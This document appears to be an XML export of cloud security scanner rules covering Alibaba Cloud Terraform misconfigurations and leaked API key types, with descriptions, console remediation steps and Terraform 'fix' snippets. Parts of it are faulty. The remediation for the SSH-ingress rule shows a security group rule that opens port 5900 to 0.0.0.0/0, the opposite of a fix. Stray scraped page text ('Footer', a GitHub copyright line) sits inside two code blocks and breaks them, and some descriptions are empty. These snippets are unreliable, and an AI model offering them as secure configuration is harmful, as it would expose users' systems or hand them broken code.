<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_oss_bucket" "pass" {
  bucket = "bucket-123-versioning"
  acl    = "private"

  versioning {
    status = "Enabled"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-versioning-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-versioning-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-versioning-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_5</key>
    <name>Ensure Alibaba Cloud Action Trail Logging for all events</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-action-trail-logging-is-not-enabled-for-all-events"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-action-trail-logging-is-not-enabled-for-all-events"></div>Alibaba Cloud Action Trail Logging is not enabled for all events</div><a aria-label="Skip link to Alibaba Cloud Action Trail Logging is not enabled for all events" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-action-trail-logging-is-not-enabled-for-all-events"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_actiontrail_trail" "pass" {
  trail_name         = "action-trail"
  oss_write_role_arn = "acs:ram::1182725xxxxxxxxxxx"
  oss_bucket_name    = "bucket_name"
  event_rw           = "All"
  trail_region       = "All"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-events' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-events</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-events' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_20</key>
    <name>Ensure Alibaba Cloud RDS instance uses SSL</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-rds-instance-does-not-use-ssl"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-rds-instance-does-not-use-ssl"></div>Alibaba Cloud RDS instance does not use SSL</div><a aria-label="Skip link to Alibaba Cloud RDS instance does not use SSL" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-rds-instance-does-not-use-ssl"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_db_instance" "pass" {
  engine              = "MySQL"
  engine_version      = "5.6"
  ssl_action          = "Open"
  instance_storage    = "30"
  instance_type       = "mysql.n2.small.25"
  parameters = [{
    name  = "innodb_large_prefix"
    value = "ON"
    }, {
    name  = "connect_timeout"
    value = "50"
  }]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-uses-ssl' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-uses-ssl</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-uses-ssl' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_1</key>
    <name>Ensure Alibaba Cloud OSS bucket is not public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-oss-bucket-is-public"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-oss-bucket-is-public"></div>Alibaba Cloud OSS bucket is public</div><a aria-label="Skip link to Alibaba Cloud OSS bucket is public" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-oss-bucket-is-public"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Object Storage Service (OSS) buckets which are publicly accessible. Alibaba Cloud OSS allows customers to store and retrieve any type of content from anywhere on the web. Often, customers have legitimate reasons to expose the OSS bucket to the public, for example, to host website content. However, these buckets often contain highly sensitive enterprise data which if left open to the public may result in sensitive data leaks.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Object Storage Service</li>
<li>In the left-side navigation pane, click on the reported bucket</li>
<li>In the 'Basic Settings' tab, In the 'Access Control List (ACL)' Section, Click on 'Configure'</li>
<li>For 'Bucket ACL' field, Choose 'Private' option</li>
<li>Click on 'Save'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_oss_bucket" "good-bucket" {
  bucket = "bucket-1732-acl"
  acl    = "private"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-not-accessible-to-public' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-not-accessible-to-public</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-not-accessible-to-public' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_2</key>
    <name>Ensure no Alibaba Cloud security groups allow ingress from 0.0.0.0:0 to port 22</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-security-group-allows-internet-traffic-to-ssh-port-22"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-security-group-allows-internet-traffic-to-ssh-port-22"></div>Alibaba Cloud Security group allows internet traffic to SSH port (22)</div><a aria-label="Skip link to Alibaba Cloud Security group allows internet traffic to SSH port (22)" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-security-group-allows-internet-traffic-to-ssh-port-22"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Security groups that allow inbound traffic on SSH port (22) from the public internet. As a best practice, restrict security groups to only allow permitted traffic and limit brute force attacks on your network.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Elastic Compute Service</li>
<li>In the left-side navigation pane, choose Network &amp; Security &gt; Security Groups</li>
<li>Select the reported security group and then click Add Rules in the Actions column</li>
<li>In Inbound tab, Select the rule having 'Action' as Allow, 'Authorization Object' as 0.0.0.0/0 and 'Port Range' value as 22, Click Modify in the Actions column</li>
<li>Replace the value 0.0.0.0/0 with specific IP address range.</li>
<li>Click on 'OK'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_security_group_rule" "allow_all_vncserver" {
  type              = "ingress"
  ip_protocol       = "tcp"
  nic_type          = "internet"
  policy            = "accept"
  port_range        = "5900/5900"
  security_group_id = alicloud_security_group.default.id
  cidr_ip           = "0.0.0.0/0"
}
Footer
&#169; 2022 GitHub, Inc.
Footer navigation
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-22' target='_blank'> https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_15</key>
    <name>Ensure Alibaba Cloud RAM password policy requires at least one symbol</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-have-a-symbol"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-have-a-symbol"></div>Alibaba Cloud RAM password policy does not have a symbol</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not have a symbol" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-have-a-symbol"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Alibaba Cloud accounts that do not have a symbol in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Resource Access Management (RAM) service</li>
<li>In the left-side navigation pane, click on 'Settings'</li>
<li>In the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'</li>
<li>In the 'Required Elements in Password' field, select 'Symbols'</li>
<li>Click on 'OK'</li>
<li>Click on 'Close'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 14
  require_lowercase_characters = false
  require_uppercase_characters = false
  require_numbers              = false
  require_symbols              = true
  hard_expiry                  = true
  max_password_age             = 14
  password_reuse_prevention    = 5
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-symbol' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-symbol</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-symbol' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_12</key>
    <name>Ensure Alibaba Cloud OSS bucket has access logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-oss-bucket-has-access-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-oss-bucket-has-access-logging-enabled"></div>Alibaba Cloud OSS bucket has access logging enabled</div><a aria-label="Skip link to Alibaba Cloud OSS bucket has access logging enabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-oss-bucket-has-access-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_oss_bucket" "pass" {
  bucket = "bucket-170309-logging"

  logging {
    target_bucket = alicloud_oss_bucket.bucket-target.id
    target_prefix = "log/"
  }
}
Footer
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-access-logging-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-access-logging-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-access-logging-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_21</key>
    <name>Airtable API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="airtable-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-airtable-api-key"></div>Airtable API Key</div><a aria-label="Skip link to Airtable API Key" class="heading-anchor-icon fa fa-anchor" href="#airtable-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Airtable is a spreadsheet-database hybrid, with the features of a database but applied to a spreadsheet. The fields in an Airtable table are similar to cells in a spreadsheet, but have types such as 'checkbox', 'phone number', and 'drop-down list', and can reference file attachments like images. Users can create a database, set up column types, add records, link tables to one another, collaborate, sort records and publish views to external websites.</p>
<p>The Airtable Airtable API key allows users to use our public API to create, fetch, update, and delete records in the bases you have access to in Airtable. API keys follow the same permissions that an account has in the Airtable UI.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>If you accidentally reveal your API key, you should regenerate your API key as soon as possible at <a href="https://airtable.com/account" target="_self">https://airtable.com/account</a>. To delete your key, click the Delete key option. This will bring up a warning that deleting your key will break your API integrations. Click the red Yes, delete key button to confirm your key deletion.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_21' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_21</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_21' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_22</key>
    <name>Algolia API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="algolia-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-algolia-api-key"></div>Algolia API Key</div><a aria-label="Skip link to Algolia API Key" class="heading-anchor-icon fa fa-anchor" href="#algolia-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Algolia is a proprietary search engine offering, usable through the software as a service (SaaS) model. API keys are necessary to work with Algolia. They give you code-level access to your account, data, and index settings. Whether you&#8217;re sending or updating your data, searching your index, or doing anything else with Algolia&#8217;s API, you need to use a valid API key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Revoking an API key makes it unusable. It&#8217;s crucial to revoke any compromised key, for example, a leaked write API key, a search API key being abused. However, keep in mind that you need to update your applications to avoid breaking them when the key they use becomes invalid. </p>
<p>You can revoke an API key by deleting it from the dashboard, or through the API, with the deleteApiKey method. When deleting a main API key, you&#8217;re also deleting all derived Secured API keys. You can never restore Secured API keys, even if you later restore the main key.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_22' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_23</key>
    <name>Alibaba Cloud Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-keys"></div>Alibaba Cloud Keys</div><a aria-label="Skip link to Alibaba Cloud Keys" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Alibaba Cloud Key Management Service (KMS) provides secure and compliant key management and cryptography services to help you encrypt and protect sensitive data assets. KMS is integrated with a wide range of Alibaba Cloud services to allow you to encrypt data across the cloud and to control its distributed environment. KMS provides key usage logs via ActionTrail, supports custom key rotation, and provides HSMs that have passed FIPS 140-2 Level 3 or other relevant validation, to help you meet your regulatory and compliance needs.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---delete"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-delete"></div>Fix - Delete</div><a aria-label="Skip link to Fix - Delete" class="heading-anchor-icon fa fa-anchor" href="#fix---delete"></a></h1>
<ol>
<li>Log on to the RAM console by using your Alibaba Cloud account.</li>
<li>In the left-side navigation pane, choose Identities &gt; Users.</li>
<li>On the Users page, click the username of a specific RAM user.</li>
<li>In the User AccessKeys section of the page that appears, find the specific AccessKey pair and click Delete in 5. the Actions column.</li>
<li>Click OK.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---rotate"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-rotate"></div>Fix - Rotate</div><a aria-label="Skip link to Fix - Rotate" class="heading-anchor-icon fa fa-anchor" href="#fix---rotate"></a></h1>
<ol>
<li>Create an AccessKey pair for rotation. </li>
<li>Update all applications and systems to use the new AccessKey pair.</li>
<li>Disable the original AccessKey pair.</li>
<li>Confirm that your applications and systems are properly running. If the applications and systems are properly running, the update succeeds. You can delete the original AccessKey pair.</li>
<li>If an application or system stops running, you must enable the original AccessKey pair, and repeat Step 2 to Step 4 until the update succeeds.</li>
<li>Delete the original AccessKey pair. For more information, see Delete an AccessKey pair.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_23' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_23</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_23' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_24</key>
    <name>Asana Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="asana-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-asana-key"></div>Asana Key</div><a aria-label="Skip link to Asana Key" class="heading-anchor-icon fa fa-anchor" href="#asana-key"></a></h1>
<p>Asana is a web and mobile work management[2] platform designed to help teams organize, track, and manage their work. It helps teams manage projects and tasks in one tool. Teams can create projects, assign work to teammates, specify deadlines, and communicate about tasks directly in Asana. It also includes reporting tools, file attachments, calendars, as well as setting and tracking company wide goals.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A user can create many, but not unlimited, personal access tokens. When creating a token you must give it a description to help you remember what you created the token for. Personal Access Tokens should be used similarly to OAuth access tokens when accessing the API, passing them in the Authorization header. You can generate a Personal Access Token from the Asana developer console. See the Authentication Quick Start for detailed instructions on getting started with PATs.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>An authorization token can be deauthorized or invalidated by making a request to Asana's API. Your app should make a POST request to <a href="https://app.asana.com/-/oauth_revoke" target="_self">https://app.asana.com/-/oauth_revoke</a>, passing the parameters as part of a standard form-encoded post body.</p>
<p>The body should include a valid Refresh Token, which will cause the Refresh Token and any Associated Bearer Tokens to be deauthorized. Bearer Tokens are not accepted in the request body since a new Bearer Token can always be obtained by reusing an authorized Refresh Token.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_24' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_24</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_24' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_25</key>
    <name>Atlassian Oauth2 Keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="atlassian-oauth2-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-atlassian-oauth-2-keys"></div>Atlassian Oauth2 Keys</div><a aria-label="Skip link to Atlassian Oauth2 Keys" class="heading-anchor-icon fa fa-anchor" href="#atlassian-oauth2-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>OAuth is an authorization protocol that contains an authentication step. OAuth allows a user (resource owner) to grant a third-party application (consumer/client) access to their information on another site (resource). This process is commonly known as the OAuth dance. Jira uses 3-legged OAuth (3LO), which means that the user is involved by authorizing access to their data on the resource (as opposed to 2-legged OAuth, where the user is not involved).</p>
<p>In Jira, a client is authenticated as the user involved in the OAuth dance and is authorized to have read and write access as that user. The data that can be retrieved and changed by the client is controlled by the user's permissions in Jira.</p>
<p>The authorization process works by getting the resource owner to grant access to their information on the resource by authorizing a request token. This request token is used by the consumer to obtain an access token from the resource. Once the client has an access token, it can use the access token to make authenticated requests to the resource until the token expires or is revoked.</p>
